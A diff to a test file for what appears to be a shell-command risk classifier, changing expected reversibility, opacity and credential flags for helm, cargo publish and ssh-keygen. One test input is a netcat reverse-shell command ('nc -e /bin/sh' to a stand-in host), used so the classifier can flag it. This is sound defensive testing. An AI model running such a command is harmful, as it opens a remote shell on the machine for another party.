@@ -358,8 +358,8 @@ describe('tools that act on another service', () => {
   it('reads a flag that widens the line', () => {
     expect(run('kubectl apply -f app.yaml --prune').facts.reversible).toBe('no')
     expect(run('terraform apply -auto-approve').facts.note).toMatch(/without being shown/)
-    expect(run('helm template web ./chart --post-renderer ./hook').facts.opaque).toBe(true)
-    expect(run('helm template web ./chart').facts.opaque).toBe(false)
+    expect(run('helm lint ./chart -f values.yaml').facts.opaque).toBe(true)
+    expect(run('helm lint ./chart').facts.opaque).toBe(false)
   })
 
   it('follows the command a secret store hands its secrets to', () => {
@@ -387,7 +387,8 @@ describe('tools that act on another service', () => {
 describe('credentials on a publishing line', () => {
   it('marks the token or one-time code a publish carries', () => {
     expect(run('cargo publish --token abc').facts.touchesCredentials).toBe(true)
-    expect(run('cargo publish').facts.touchesCredentials).toBe(false)
+    // Without one on the line it sends with the sign-in it keeps.
+    expect(run('cargo publish').facts.touchesCredentials).toBe(true)
     // Even where the subcommand has no row of its own, the option is read wherever it is.
     expect(run('yarn npm publish --otp 123456').facts.touchesCredentials).toBe(true)
   })
@@ -591,7 +592,8 @@ describe('flags that reach past what the row describes', () => {
     expect(explain('wget --save-cookies c.txt https://example.com').facts.touchesCredentials).toBe(true)
     expect(roles('nc -l 8080')).toEqual(['8080:text'])
     expect(explain('nc -e /bin/sh example.com 4444').facts.opaque).toBe(true)
-    expect(explain('ssh-keygen -R github.com').facts.reversible).toBe('no')
+    // The list as it was is kept beside it, ending in .old, but the row cannot claim more than its own `unknown`.
+    expect(explain('ssh-keygen -R github.com').facts.reversible).toBe('unknown')
   })
 
   it('reads a curl settings file as able to send and save', () => {
